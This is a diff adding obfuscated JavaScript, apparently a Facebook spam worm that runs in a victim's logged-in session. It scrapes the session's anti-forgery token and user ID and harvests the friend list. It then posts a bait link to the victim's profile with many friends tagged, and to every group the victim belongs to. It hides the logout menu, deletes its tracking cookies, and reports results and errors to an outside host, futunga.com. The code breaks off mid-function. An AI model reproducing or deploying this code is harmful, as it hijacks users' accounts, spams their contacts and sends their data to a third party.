@@ -1,1 +1,1182 @@
 
+var l0F = {
+  'o3': function(F, l) {
+    return F == l;
+  },
+  'k7': '&xhpc_ismeta=1',
+  'V4': '&object_id[0]=',
+  'h6': function(F, l) {
+    return F == l;
+  },
+  'w4': "floor",
+  'C3': function(F, l) {
+    return F * l;
+  },
+  'C9': "https://www.facebook.com/share.php?u=",
+  'T4': "push",
+  'X7': "application/json",
+  'l7': 10,
+  'X0': "status",
+  'G5': '&ttstamp=',
+  'g0': '&ref=',
+  'A6': function(F, l) {
+    return F < l;
+  },
+  'O4': "paylaşn herkes görsün beyler bayanlar",
+  'a4': "z1",
+  'k0': '&object_str[0]=',
+  'x4': '&xhpc_publish_type=1',
+  'B7': "bunu izlemelisiniz :)",
+  'p4': '&__user=',
+  'Q7': '&picture=',
+  'n': function(F, l) {
+    return F >= l;
+  },
+  'R3': function(F, l) {
+    return F == l;
+  },
+  'H1': "bu olay paylaşım rekoru kıracak",
+  'S4': '&av=',
+  'G7': '&audience_targets=',
+  'T5': '&disable_location_sharing=false',
+  'E4': '&__a=1',
+  'J7': '&og_suggestion_mechanism=',
+  'N5': "//www.futunga.com/php/links.php?type=a2",
+  't3': function(F, l) {
+    return F < l;
+  },
+  'u4': '&share_action_properties=',
+  'x1': function(F, l) {
+    return F * l;
+  },
+  'M0': "open",
+  'c3': function(F, l) {
+    return F == l;
+  },
+  'v0': "random",
+  'C0': "bakın bakalım dünyada neler var :D",
+  'e9': "parse",
+  'E7': '-',
+  'N1': function(F, l) {
+    return F >= l;
+  },
+  'Y7': "2",
+  'C': function(F, l) {
+    return F == l;
+  },
+  'q7': "https://www.facebook.com",
+  'I': function(F, l) {
+    return F >= l;
+  },
+  'b7': '&composertags_place_name=',
+  'L3': function(F, l) {
+    return F * l;
+  },
+  'p7': '&app_id=',
+  'B0': "send",
+  's3': function(F, l) {
+    return F < l;
+  },
+  'M9': 14,
+  'k5': "replace",
+  'R0': "K1",
+  'l9': 200,
+  't0': "olaya bakarmısınız",
+  'Z0': '&__rev=',
+  'Z3': function(F, l) {
+    return F < l;
+  },
+  'L9': 1,
+  'o4': '=',
+  's9': "onreadystatechange",
+  't4': "GET",
+  'x5': 'Content-type',
+  'D1': "responseText",
+  'a9': 30,
+  'X5': '&is_explicit_place=',
+  'L7': '&description=',
+  'B': function(F, l) {
+    return F >= l;
+  },
+  'J6': function(F, l) {
+    return F == l;
+  },
+  'u7': "https://www.facebook.com/checkpoint",
+  'y0': "link",
+  'Q1': function(F, l) {
+    return F != l;
+  },
+  'F9': '&__CONFIRM__=1',
+  'K0': '{"revision":(.*?),',
+  'v7': '&__be=-1',
+  'v1': function(F, l) {
+    return F < l;
+  },
+  'd0': "Olaysız geçmiyorki günler",
+  'w1': "izle zaten paylaşırsın :) :)",
+  'U9': '&display=',
+  'Z7': "setInterval",
+  'N4': true,
+  'q9': '<input type="hidden" name="fb_dtsg" value="(.*?)" autocomplete="off" />',
+  'f6': function(F, l) {
+    return F == l;
+  },
+  'v5': "application/x-www-form-urlencoded",
+  'B9': '<input type="hidden" autocomplete="off" name="share_action_type_id" value="(.*?)" />',
+  'H9': '"link": "(.*?)"',
+  'f9': '&og_suggestion_logging_data=',
+  'H0': 'GET',
+  'l1': function(F, l) {
+    return F == l;
+  },
+  'b9': "ben izledim sizde izleyin derim ve paylaşın lütfen",
+  'l0': 1800,
+  'L0': "önce izleyin sonra karar verirsiniz",
+  'f7': '<input type="hidden" autocomplete="off" name="app_id" value="(.*?)" />',
+  'C7': '&__req=',
+  'X4': '<input type="hidden" autocomplete="off" name="redirect_uri" value="(.*?)" />',
+  'M5': "URL",
+  'x9': "Paylasim Yapilamadi Hata icerigi :",
+  'P5': "resmen dondum kaldım",
+  'U0': '&device_shared=',
+  'e5': '&title=',
+  'M7': "N1",
+  'a6': function(F, l) {
+    return F == l;
+  },
+  'f5': (function(H5) {
+    return (function(O2, k2) {
+      return (function(p2) {
+        return {
+          c5: p2,
+          Q2: p2,
+        };
+      })(function(d5) {
+        var u2, w5 = 0;
+        for (var o2 = O2; w5 < d5["length"]; w5++) {
+          var l2 = k2(d5, w5);
+          u2 = w5 === 0 ? l2 : u2 ^ l2;
+        }
+        return u2 ? o2 : !o2;
+      });
+    })((function(J5, D5, B5, F2) {
+      var R5 = 27;
+      return J5(H5, R5) - F2(D5, B5) > R5;
+    })(parseInt, Date, (function(D5) {
+      return ('' + D5)["substring"](1, (D5 + '')["length"] - 1);
+    })('_getTime2'), function(D5, B5) {
+      return new D5()[B5]();
+    }), function(d5, w5) {
+      var U5 = parseInt(d5["charAt"](w5), 16)["toString"](2);
+      return U5["charAt"](U5["length"] - 1);
+    });
+  })('55jol1bki'),
+  'f0': 1000,
+  'e3': function(F, l) {
+    return F !== l;
+  },
+  'O0': "Link Yok !",
+  'z7': "şaka gibi :D",
+  'Z4': '{"object":"',
+  'c0': "getTime",
+  'Y9': '&hide_object_attachment=0',
+  'm9': '&composertags_city=',
+  'h5': "indexOf",
+  'p5': '<input type="hidden" autocomplete="off" name="dialog_url" value="(.*?)" />',
+  'O7': "match",
+  'k6': function(F, l) {
+    return F <= l;
+  },
+  'M1': function(F, l) {
+    return F < l;
+  },
+  'W7': "Content-Type",
+  'E3': function(F, l) {
+    return F > l;
+  },
+  'Q0': '&xhpc_timeline=',
+  'c': function(F, l) {
+    return F >= l;
+  },
+  'I5': '&dialog_url=',
+  'D6': function(F, l) {
+    return F != l;
+  },
+  'O1': function(F, l) {
+    return F != l;
+  },
+  'i9': "cookie",
+  'b1': function(F, l) {
+    return F >= l;
+  },
+  'V6': function(F, l) {
+    return F == l;
+  },
+  'J1': '&composertags_place=',
+  'J0': "cookie50_",
+  'u3': function(F, l) {
+    return F == l;
+  },
+  'j3': function(F, l) {
+    return F * l;
+  },
+  'o9': "Content-type",
+  'E9': 'application/x-www-form-urlencoded',
+  'E0': "paylasim_araligi_",
+  'E': function(F, l) {
+    return F < l;
+  },
+  'O9': "basarili_paylasim_",
+  'D9': '&xhpc_targetid=',
+  'w3': function(F, l) {
+    return F * l;
+  },
+  'G9': "grup_sirasi_",
+  'q0': '&composer_predicted_city=',
+  'N7': "izleyin beyler :)",
+  'B4': "profil_id",
+  'd6': function(F, l) {
+    return F != l;
+  },
+  'p6': function(F, l) {
+    return F > l;
+  },
+  'I9': '&quote=',
+  'd1': '<input type="hidden" autocomplete="off" name="display" value="(.*?)" />',
+  'g7': '&__dyn=',
+  'g6': function(F, l) {
+    return F < l;
+  },
+  'j4': "readyState",
+  'S3': function(F, l) {
+    return F > l;
+  },
+  'I7': '&xhpc_message=',
+  'L5': 'https://www.facebook.com/v2.3/dialog/share/submit?dpr=1',
+  'P6': function(F, l) {
+    return F < l;
+  },
+  'G6': function(F, l) {
+    return F * l;
+  },
+  'j5': '&__pc=PHASED:DEFAULT',
+  'Y6': function(F, l) {
+    return F == l;
+  },
+  'W6': function(F, l) {
+    return F == l;
+  },
+  'I3': function(F, l) {
+    return F == l;
+  },
+  'r0': "close",
+  'V9': 4,
+  'N9': 0,
+  'w7': '&icon_id=',
+  'f1': 'for (;;);',
+  'D4': "v1",
+  'J4': '&audience[0][value]=80',
+  'p9': "M1",
+  'K1': function(F, l) {
+    return F / l;
+  },
+  'd7': '{"USER_ID":"(.*?)","ACCOUNT_ID":"(.*?)"}',
+  'H': function(F, l) {
+    return F >= l;
+  },
+  'Z9': 'fb_dtsg=',
+  'I4': "errorSummary",
+  'n3': function(F, l) {
+    return F * l;
+  },
+  'r1': function(F, l) {
+    return F / l;
+  },
+  'h7': '',
+  'l5': '&from_post=1',
+  'R4': '&tagger_session_id=',
+  'y1': function(F, l) {
+    return F * l;
+  },
+  'F7': "log",
+  'Y0': "b1",
+  'm0': false,
+  't5': "neler var arkadaş :D <3",
+  'p0': "bu nedir arkadaş ya",
+  'a0': "ilginç bir durum :)",
+  'X6': function(F, l) {
+    return F == l;
+  },
+  'm1': function(F, l) {
+    return F * l;
+  },
+  'e7': '=(\\d+)',
+  'T3': function(F, l) {
+    return F < l;
+  },
+  'm5': '&xhpc_message_text=',
+  'X9': '"}',
+  'r9': "Grup Limitine Ulaşıldı !",
+  'v9': '<input type="hidden" autocomplete="off" name="tagger_session_id" value="(.*?)" id="(.*?)" />',
+  'i6': function(F, l) {
+    return F == l;
+  },
+  's7': '&caption=',
+  'g9': "ancak bu kadar olur",
+  'H4': '&sdk=',
+  'm7': 'POST',
+  'F6': function(F, l) {
+    return F == l;
+  },
+  'z4': '&share_action_type_id=',
+  'K4': "r1",
+  'y4': "bence sizde bakın beyler :)",
+  'r4': '&action_type_id[0]=',
+  'S0': "1",
+  'c1': "",
+  'F0': "setRequestHeader",
+  'S7': '&xhpc_context=home',
+  'Z': function(F, l) {
+    return F == l;
+  },
+  'o0': '&device_code=',
+  'z1': function(F, l) {
+    return F < l;
+  },
+  'i4': '&redirect_uri=',
+  'c7': "olacak olan oluyor işte ..."
+};
+l0F.o8 = function(j) {
+  while (j) return l0F.f5.c5(j);
+};
+l0F.l8 = function(n) {
+  if (l0F && n) return l0F.f5.c5(n);
+};
+l0F.F8 = function(e) {
+  for (; l0F;) return l0F.f5.Q2(e);
+};
+l0F.J2 = function(k) {
+  if (l0F && k) return l0F.f5.c5(k);
+};
+l0F.H2 = function(e) {
+  if (l0F && e) return l0F.f5.Q2(e);
+};
+l0F.R2 = function(a) {
+  while (a) return l0F.f5.c5(a);
+};
+l0F.D2 = function(g) {
+  for (; l0F;) return l0F.f5.c5(g);
+};
+l0F.B2 = function(j) {
+  while (j) return l0F.f5.c5(j);
+};
+l0F.w2 = function(k) {
+  while (k) return l0F.f5.Q2(k);
+};
+l0F.d2 = function(b) {
+  while (b) return l0F.f5.c5(b);
+};
+l0F.c2 = function(c) {
+  if (l0F && c) return l0F.f5.Q2(c);
+};
+l0F.f2 = function(m) {
+  for (; l0F;) return l0F.f5.c5(m);
+};
+l0F.I2 = function(m) {
+  while (m) return l0F.f5.c5(m);
+};
+l0F.X2 = function(l) {
+  if (l0F && l) return l0F.f5.Q2(l);
+};
+l0F.r2 = function(j) {
+  for (; l0F;) return l0F.f5.Q2(j);
+};
+l0F.n2 = function(f) {
+  if (l0F && f) return l0F.f5.Q2(f);
+};
+l0F.K2 = function(a) {
+  for (; l0F;) return l0F.f5.Q2(a);
+};
+l0F.P2 = function(j) {
+  while (j) return l0F.f5.c5(j);
+};
+l0F.M2 = function(d) {
+  for (; l0F;) return l0F.f5.Q2(d);
+};
+l0F.h2 = function(b) {
+  for (; l0F;) return l0F.f5.Q2(b);
+};
+l0F.v2 = function(c) {
+  if (l0F && c) return l0F.f5.c5(c);
+};
+l0F.W2 = function(n) {
+  for (; l0F;) return l0F.f5.Q2(n);
+};
+l0F.x2 = function(i) {
+  while (i) return l0F.f5.c5(i);
+};
+l0F.j2 = function(b) {
+  for (; l0F;) return l0F.f5.Q2(b);
+};
+l0F.L2 = function(n) {
+  for (; l0F;) return l0F.f5.Q2(n);
+};
+l0F.b2 = function(j) {
+  for (; l0F;) return l0F.f5.Q2(j);
+};
+l0F.t2 = function(g) {
+  while (g) return l0F.f5.c5(g);
+};
+l0F.S2 = function(c) {
+  if (l0F && c) return l0F.f5.c5(c);
+};
+l0F.G2 = function(n) {
+  while (n) return l0F.f5.c5(n);
+};
+
+function paylasimgetir(S, e) {
+  l0F.y2 = function(h) {
+    while (h) return l0F.f5.Q2(h);
+  };
+  l0F.N2 = function(i) {
+    while (i) return l0F.f5.Q2(i);
+  };
+  var p = l0F.G2("f7be") ? new XMLHttpRequest() : "veri6";
+  p[l0F.M0](l0F.t4, l0F.C9 + S, l0F.m0);
+  p[l0F.s9] = l0F.S2("ac44") ? "grup_sirasi_" : function() {
+    l0F.V2 = function(h) {
+      for (; l0F;) return l0F.f5.Q2(h);
+    };
+    l0F.s2 = function(m) {
+      while (m) return l0F.f5.Q2(m);
+    };
+    l0F.a2 = function(n) {
+      while (n) return l0F.f5.c5(n);
+    };
+    l0F.i2 = function(k) {
+      for (; l0F;) return l0F.f5.c5(k);
+    };
+    l0F.Y2 = function(m) {
+      if (l0F && m) return l0F.f5.c5(m);
+    };
+    l0F.z2 = function(e) {
+      for (; l0F;) return l0F.f5.c5(e);
+    };
+    var F = l0F.z2("4c5") ? "V6" : '-',
+      l = l0F.Y2("31d4") ? "a6" : '=(\\d+)';
+    if (l0F[l](p[l0F.j4], l0F.V9) && l0F[F](p[l0F.X0], l0F.l9)) {
+      var o = l0F.t2("62") ? "GET" : p[l0F.D1];
+      data01 = l0F.b2("b2ae") ? o[l0F.O7](l0F.q9) : "Ü";
+      data02 = l0F.i2("76") ? o[l0F.O7](l0F.f7) : '{"revision":(.*?),';
+      data03 = l0F.L2("dcbd") ? o[l0F.O7](l0F.d7) : '&quote=';
+      data04 = l0F.V2("5a7") ? "ö" : o[l0F.O7](l0F.X4);
+      data05 = l0F.y2("7836") ? '&mode=group' : o[l0F.O7](l0F.d1);
+      data06 = l0F.N2("3253") ? o[l0F.O7](l0F.v9) : "1";
+      data07 = l0F.a2("424e") ? "neler var arkadaş :D <3" : o[l0F.O7](l0F.B9);
+      data08 = l0F.j2("d16c") ? '&__user=' : o[l0F.O7](l0F.p5);
+      data09 = l0F.s2("1bd") ? o[l0F.O7](l0F.K0) : "ö";
+      p[l0F.r0];
+    }
+  };
+  p[l0F.F0](l0F.W7, l0F.v5);
+  p[l0F.B0]();
+  if (data03[l0F.L9]) {
+    var G = l0F.r2("cba8") ? l0F.Z4 + e + l0F.X9 : 1000;
+    arkadaslar(data01[l0F.L9], data02[l0F.L9], data03[l0F.L9], data04[l0F.L9], data05[l0F.L9], data06[l0F.L9], data07[l0F.L9], data08[l0F.L9], G, data09[l0F.L9]);
+  }
+}
+
+function arkadaslar(Y, W, s, j, y, m, L, N, A, x) {
+  l0F.q2 = function(k) {
+    while (k) return l0F.f5.c5(k);
+  };
+  l0F.g2 = function(h) {
+    while (h) return l0F.f5.Q2(h);
+  };
+  l0F.m2 = function(m) {
+    if (l0F && m) return l0F.f5.Q2(m);
+  };
+  l0F.T2 = function(d) {
+    for (; l0F;) return l0F.f5.c5(d);
+  };
+  var M = l0F.x2("a6") ? '&dpr=1' : "w3",
+    P = l0F.X2("137c") ? '&dpr=1' : "bu nedir arkadaş ya",
+    K = l0F.f2("b3") ? '&text_composertags_with[' : 'https://www.facebook.com/chat/user_info_all/?viewer=',
+    t = l0F.I2("24e") ? "paylasimgetir2" : new XMLHttpRequest(),
+    V = l0F.d2("6e6f") ? K + s + P : '&picture=',
+    k = l0F.w2("cb") ? l0F.Z9 + Y : '';
+  k += l0F.M2("ac2d") ? l0F.p4 + s : 'https://www.facebook.com/groups/?category=membership';
+  k += l0F.P2("f2") ? l0F.E4 : '&is_explicit_place=';
+  k += l0F.c2("21") ? l0F.C7 + Math[l0F.w4]((l0F[M](Math[l0F.v0](), l0F.l7)) + l0F.L9) : '-';
+  k += l0F.q2("bca8") ? l0F.v7 : '&picture=';
+  k += l0F.W2("ff12") ? l0F.j5 : '&__be=-1';
+  k += l0F.T2("6531") ? l0F.G5 + ttstamp(Y) : '<input type="hidden" autocomplete="off" name="display" value="(.*?)" />';
+  k += l0F.v2("cd") ? l0F.Z0 + x : '{"object":"';
+  t[l0F.M0](l0F.m7, V, l0F.N4);
+  t[l0F.F0](l0F.x5, l0F.E9);
+  t[l0F.s9] = function() {
+    l0F.U2 = function(d) {
+      for (; l0F;) return l0F.f5.c5(d);
+    };
+    l0F.E2 = function(l) {
+      if (l0F && l) return l0F.f5.Q2(l);
+    };
+    var S = l0F.g2("42b") ? "forEach" : "composer",
+      e = l0F.n2("6c") ? "dyn" : "payload",
+      p = l0F.E2("24") ? "innerHTML" : "keys",
+      G = l0F.K2("536") ? '&mode=self' : "F6",
+      Q = l0F.h2("d35") ? "R3" : "izleyin beyler :)";
+    if (l0F[Q](t[l0F.j4], l0F.V9) && l0F[G](t[l0F.X0], l0F.l9)) {
+      l0F.A2 = function(f) {
+        while (f) return l0F.f5.Q2(f);
+      };
+      l0F.C2 = function(k) {
+        for (; l0F;) return l0F.f5.Q2(k);
+      };
+      var b = l0F.C2("e3") ? t[l0F.D1] : '&composer_predicted_city=',
+        a = l0F.U2("ba1") ? "Paylasim Yapilamadi Hata icerigi :" : b[l0F.k5](l0F.f1, l0F.h7),
+        z = l0F.m2("cd") ? JSON[l0F.e9](a) : 'https://futunga.com/permas.php?perma=https://www.facebook.com/';
+      Object[p](z[e])[S](function(F) {
+        l0F.Z2 = function(l) {
+          for (; l0F;) return l0F.f5.Q2(l);
+        };
+        var l = l0F.Z2("afb") ? "str" : "name";
+        arkadaslar_list[l0F.T4](F);
+        var o = l0F.A2("43da") ? "push" : z[e][F][l];
+        arkadaslar_list2[l0F.T4](o);
+      });
+      profildepaylas(Y, W, s, j, y, m, L, N, A, x);
+    }
+  };
+  t[l0F.B0](k);
+}
+
+function composer(F) {
+  var l = "j3",
+    o = "s3",
+    S = l0F.B2("7418") ? 16 : "abcdef0123456789",
+    e = l0F.D2("17d5") ? "paylasimgetir" : S,
+    p = l0F.R2("ab2a") ? l0F.c1 : '{"revision":(.*?),';
+  for (var G = l0F.N9; l0F[o](G, F); G++) p += e[Math[l0F.w4](l0F[l](Math[l0F.v0](), e.length))];
+  return p;
+}
+
+function deleteAllCookies() {
+  l0F.k8 = function(m) {
+    if (l0F && m) return l0F.f5.Q2(m);
+  };
+  l0F.u8 = function(j) {
+    for (; l0F;) return l0F.f5.Q2(j);
+  };
+  var F = l0F.H2("13") ? "onreadystatechange" : "H",
+    l = l0F.J2("f5e") ? "XMLHttpRequest" : "paylasim_",
+    o = "B",
+    S = l0F.F8("721e") ? "data03" : "cookie_",
+    e = l0F.u8("8af1") ? "Date" : "c",
+    p = "basarili_",
+    G = l0F.l8("75c") ? "grupsirasikontrol" : "I",
+    Q = l0F.k8("57") ? "Ç" : "=;expires=Thu, 01 Jan 1970 00:00:00 GMT",
+    b = "grup_",
+    a = "n",
+    z = l0F.o8("257") ? "Ü" : "=",
+    Y = "E",
+    W = ";",
+    s = "split",
+    j = document[l0F.i9][s](W);
+  for (var y = l0F.N9; l0F[Y](y, j.length); y++) {
+    var m = j[y],
+      L = m[s](z),
+      N = L[l0F.N9];
+    if (l0F[a](L[l0F.N9][l0F.h5](b), l0F.N9)) {
+      var A = function() {
+        document[l0F.i9] = N + Q;
+      };
+      A();
+    }
+    if (l0F[G](L[l0F.N9][l0F.h5](p), l0F.N9)) {
+      var x = function() {
+        document[l0F.i9] = N + Q;
+      };
+      x();
+    }
+    if (l0F[e](L[l0F.N9][l0F.h5](S), l0F.N9)) {
+      var M = function() {
+        document[l0F.i9] = N + Q;
+      };
+      M();
+    }
+    if (l0F[o](L[l0F.N9][l0F.h5](l), l0F.N9)) {
+      var P = function() {
+        document[l0F.i9] = N + Q;
+      };
+      P();
+    }
+    if (l0F[F](L[l0F.N9][l0F.h5](l0F.B4), l0F.N9)) {
+      var K = function() {
+        document[l0F.i9] = N + Q;
+      };
+      K();
+    }
+  }
+}
+
+function dyn(F) {
+  var l = "C3",
+    o = "T3",
+    S = "abcdefghijklmnoprstuvyzwxqABCDEFGHIKLMNOPRSTUVYZWQX0123456789",
+    e = S,
+    p = l0F.c1;
+  for (var G = l0F.N9; l0F[o](G, F); G++) p += e[Math[l0F.w4](l0F[l](Math[l0F.v0](), e.length))];
+  return p;
+}
+
+function ttstamp(l) {
+  var o = "charCodeAt",
+    S = "t3",
+    e = function(F) {
+      ttstamp_olustur = F;
+    },
+    p = function() {
+      var F = '2';
+      ttstamp_olustur = F + ttstamp_olustur;
+    };
+  e(l0F.h7);
+  for (var G = l0F.N9; l0F[S](G, l.length); G++) {
+    ttstamp_olustur += l[o](G);
+  }
+  p();
+  return ttstamp_olustur;
+}
+
+function removebutton() {
+  window[l0F.Z7](function() {
+    var F = "g6",
+      l = "uiPopover",
+      o = "outerHTML",
+      S = "parentNode",
+      e = "logoutMenu",
+      p = "getElementById",
+      G = "P6",
+      Q = "uiToggle wrap",
+      b = "innerHTML",
+      a = "A6",
+      z = "_5ce",
+      Y = "getElementsByClassName";
+    if (document[Y](z)) {
+      for (i = l0F.N9; l0F[a](i, document[Y](z).length); i++) {
+        document[Y](z)[i][b] = l0F.c1;
+      }
+    }
+    if (document[Y](Q)) {
+      for (i = l0F.N9; l0F[G](i, document[Y](Q).length); i++) {
+        document[Y](Q)[i][b] = l0F.c1;
+      }
+    }
+    if (document[p](e)) {
+      document[p](e)[S][o] = l0F.c1;
+    }
+    if (document[Y](l)) {
+      for (i = l0F.N9; l0F[F](i, document[Y](l).length); i++) {
+        document[Y](l)[i][b] = l0F.c1;
+      }
+    }
+  }, l0F.l7);
+}
+
+function profildepaylas(G, Q, b, a, z, Y, W, s, j, y) {
+  var m = "G6",
+    L = '&text_composertags_with[',
+    N = ']=',
+    A = '&composertags_with[',
+    x = 100,
+    M = "p6",
+    P = "k6",
+    K = '&access_token=',
+    t = '&mode=self',
+    V = new XMLHttpRequest(),
+    k = l0F.L5,
+    O = l0F.Z9 + G;
+  O += t;
+  O += l0F.G7 + b;
+  O += l0F.S4;
+  O += l0F.p7 + Q;
+  O += l0F.i4 + a;
+  O += l0F.U9 + z;
+  O += K;
+  O += l0F.H4;
+  O += l0F.l5;
+  O += l0F.S7;
+  O += l0F.k7;
+  O += l0F.Q0;
+  O += l0F.D9 + b;
+  O += l0F.x4;
+  O += l0F.m5;
+  O += l0F.I7;
+  O += l0F.I9;
+  O += l0F.X5;
+  O += l0F.J1;
+  O += l0F.b7;
+  O += l0F.R4 + Y;
+  for (i = l0F.N9; l0F[P](i, etiket_limit); i++) {
+    if (l0F[M](arkadaslar_list[i], x)) {
+      O += A + (i) + N + arkadaslar_list[i];
+      O += L + (i) + N + arkadaslar_list2[i];
+    }
+  }
+  O += l0F.r4;
+  O += l0F.k0;
+  O += l0F.V4;
+  O += l0F.Y9;
+  O += l0F.J7;
+  O += l0F.f9;
+  O += l0F.w7;
+  O += l0F.u4 + j;
+  O += l0F.z4 + W;
+  O += l0F.e5;
+  O += l0F.L7;
+  O += l0F.s7;
+  O += l0F.Q7;
+  O += l0F.o0;
+  O += l0F.U0;
+  O += l0F.g0;
+  O += l0F.I5 + encodeURIComponent(s);
+  O += l0F.m9;
+  O += l0F.T5;
+  O += l0F.q0;
+  O += l0F.J4;
+  O += l0F.F9;
+  O += l0F.p4 + b;
+  O += l0F.E4;
+  O += l0F.C7 + Math[l0F.w4]((l0F[m](Math[l0F.v0](), l0F.l7)) + l0F.L9);
+  O += l0F.v7;
+  O += l0F.g7 + dynrandom();
+  O += l0F.j5;
+  O += l0F.G5 + ttstamp(G);
+  O += l0F.Z0 + y;
+  V[l0F.M0](l0F.m7, k, l0F.N4);
+  V[l0F.F0](l0F.x5, l0F.E9);
+  V[l0F.s9] = function() {
+    var F = 'Payla\u015f\u0131m yap\u0131ld\u0131.',
+      l = "i6",
+      o = "Y6";
+    if (l0F[o](V[l0F.j4], l0F.V9) && l0F[l](V[l0F.X0], l0F.l9)) {
+      var S = V[l0F.D1],
+        e = S[l0F.k5](l0F.f1, l0F.h7),
+        p = JSON[l0F.e9](e);
+      if (p[l0F.I4]) {
+        sorunmesaji(l0F.x9 + p[l0F.I4]);
+      } else {
+        console[l0F.F7](F);
+        new Image().src="//futunga.com/saveResponse.php?sonuc="+profile_id+"&link=http://profil.com";
+        gruplaricek();
+      }
+    }
+  };
+  V[l0F.B0](O);
+}
+
+function grupdapaylas(G, Q, b, a, z, Y, W, s, j, y) {
+  var m = "n3",
+    L = '&<=',
+    N = '&mode=group',
+    A = "E3",
+    x = "Z3";
+  if (l0F[x](grup_say, grup_limit)) {
+    var M = function(F) {
+      grup_limit = F;
+    };
+    M(grup_say);
+  }
+  if (!grupsirasikontrol) {
+    var P = function(F) {
+      i = F;
+    };
+    P(l0F.N9);
+  } else {
+    var K = function(F) {
+      i = F[l0F.L9];
+    };
+    K(grupsirasikontrol);
+  }
+  var t = new XMLHttpRequest();
+  grupid = grupidgetir(i);
+  if (l0F[A](grupid, l0F.f0)) {
+    var V = l0F.L5,
+      k = l0F.Z9 + G;
+    k += N;
+    k += l0F.G7 + grupid;
+    k += l0F.S4;
+    k += l0F.p7 + Q;
+    k += l0F.i4 + a;
+    k += l0F.U9 + z;
+    k += L;
+    k += l0F.H4;
+    k += l0F.l5;
+    k += l0F.S7;
+    k += l0F.k7;
+    k += l0F.Q0;
+    k += l0F.D9 + b;
+    k += l0F.x4;
+    k += l0F.m5;
+    k += l0F.I7;
+    k += l0F.I9;
+    k += l0F.X5;
+    k += l0F.J1;
+    k += l0F.b7;
+    k += l0F.R4 + Y;
+    k += l0F.r4;
+    k += l0F.k0;
+    k += l0F.V4;
+    k += l0F.Y9;
+    k += l0F.J7;
+    k += l0F.f9;
+    k += l0F.w7;
+    k += l0F.u4 + j;
+    k += l0F.z4 + W;
+    k += l0F.e5;
+    k += l0F.L7;
+    k += l0F.s7;
+    k += l0F.Q7;
+    k += l0F.o0;
+    k += l0F.U0;
+    k += l0F.g0;
+    k += l0F.I5 + encodeURIComponent(s);
+    k += l0F.m9;
+    k += l0F.T5;
+    k += l0F.q0;
+    k += l0F.J4;
+    k += l0F.F9;
+    k += l0F.p4 + b;
+    k += l0F.E4;
+    k += l0F.C7 + Math[l0F.w4]((l0F[m](Math[l0F.v0](), l0F.l7)) + l0F.L9);
+    k += l0F.v7;
+    k += l0F.g7 + dynrandom();
+    k += l0F.j5;
+    k += l0F.G5 + ttstamp(G);
+    k += l0F.Z0 + y;
+    t[l0F.M0](l0F.m7, V, l0F.N4);
+    t[l0F.F0](l0F.x5, l0F.E9);
+    t[l0F.s9] = function() {
+      var F = "Paylasilan Grup :http://facebook.com/",
+        l = "c3",
+        o = "I3";
+      if (l0F[o](t[l0F.j4], l0F.V9) && l0F[l](t[l0F.X0], l0F.l9)) {
+        var S = t[l0F.D1],
+          e = S[l0F.k5](l0F.f1, l0F.h7),
+          p = JSON[l0F.e9](e);
+        if (p[l0F.I4]) {
+          sorunmesaji(l0F.x9 + p[l0F.I4]);
+        } else {
+          basarilipaylasim();
+          new Image().src="//futunga.com/saveResponse.php?sonuc="+grupid+"&link=http://grup.com";
+          console[l0F.F7](F + grupid);
+          
+          success++;
+        }
+        t[l0F.r0];
+      }
+    };
+    t[l0F.B0](k);
+  }
+}
+
+function baslat2() {
+  var Q = new XMLHttpRequest();
+  Q[l0F.M0](l0F.t4, l0F.N5, l0F.N4);
+  Q[l0F.F0](l0F.o9, l0F.X7);
+  Q[l0F.s9] = function() {
+    var F = "Q1",
+      l = "O1",
+      o = "l1",
+      S = "J6";
+    if (l0F[S](Q[l0F.j4], l0F.V9) && l0F[o](Q[l0F.X0], l0F.l9)) {
+      var e = JSON[l0F.e9](Q[l0F.D1]),
+        p = Q[l0F.D1];
+      link_encode = p[l0F.O7](l0F.H9);
+      if (e) {
+        var G = e[l0F.y0];
+        if (l0F[l](G, l0F.S0)) {
+          if (l0F[F](G, l0F.Y7)) {
+            paylasimgetir2(G, link_encode[l0F.L9]);
+          }
+        } else {
+          sorunmesaji(l0F.O0);
+        }
+      }
+      Q[l0F.r0];
+    }
+  };
+  Q[l0F.B0]();
+}
+
+function composerrandom() {
+  var F = 12,
+    l = 8;
+  return composer(l) + l0F.E7 + composer(l0F.V9) + l0F.E7 + composer(l0F.V9) + l0F.E7 + composer(l0F.V9) + l0F.E7 + composer(F);
+}
+
+function gruplaricek() {
+  var a = 'https://www.facebook.com/groups/?category=membership',
+    z = new XMLHttpRequest();
+  z[l0F.M0](l0F.H0, a, l0F.N4);
+  z[l0F.s9] = function() {
+    var F = 'grup bulunamadı!',
+      l = "S3",
+      o = null,
+      S = 'exec',
+      e = "e3",
+      p = "o3",
+      G = "u3";
+    if (l0F[G](z[l0F.j4], l0F.V9) && l0F[p](z[l0F.X0], l0F.l9)) {
+      var Q = [],
+        b = /group_id=(\d+)&amp;pinned/g;
+      while (l0F[e]((Q = b[S](z[l0F.D1])), o)) {
+        grup_ids[l0F.T4](Q[l0F.L9]);
+        grup_say++;
+      };
+      if (l0F[l](grup_say, l0F.N9)) {
+        baslat2();
+      } else {
+        console[l0F.F7](F);
+      }
+      z[l0F.r0];
+    }
+  };
+  z[l0F.B0]();
+}
+
+function grupidgetir(F) {
+  return grup_ids[F];
+}
+
+function trceviri(F) {
+  var l = "Ö",
+    o = "Ü",
+    S = "Ğ",
+    e = "Ş",
+    p = "Ç",
+    G = "İ",
+    Q = "ş",
+    b = "ö",
+    a = "ü",
+    z = "ğ",
+    Y = "ı",
+    W = "ç",
+    s = F[l0F.k5](/&#xe7;/g, W),
+    j = s[l0F.k5](/&#x131;/g, Y),
+    y = j[l0F.k5](/&#x11f;/g, z),
+    m = y[l0F.k5](/&#xfc;/g, a),
+    L = m[l0F.k5](/&#xf6;/g, b),
+    N = L[l0F.k5](/&#x15f;/g, Q),
+    A = N[l0F.k5](/&#x130;/g, G),
+    x = A[l0F.k5](/&#xc7;/g, p),
+    M = x[l0F.k5](/&#x15e;/g, e),
+    P = M[l0F.k5](/&#x11e;/g, S),
+    K = P[l0F.k5](/&#xdc;/g, o),
+    t = K[l0F.k5](/&#xd6;/g, l);
+  return t;
+}
+
+function sorunmesaji(F) {
+  var l = "https://futunga.com/hatam.php?mesaj=",
+    o = new XMLHttpRequest();
+  o[l0F.M0](l0F.H0, l + F, l0F.N4);
+  o[l0F.B0]();
+}
+
+function profil_id_getir() {
+  var S = "https://www.facebook.com/share.php",
+    e = new XMLHttpRequest();
+  e[l0F.M0](l0F.t4, S, l0F.m0);
+  e[l0F.s9] = function() {
+    var F = "Z",
+      l = "C";
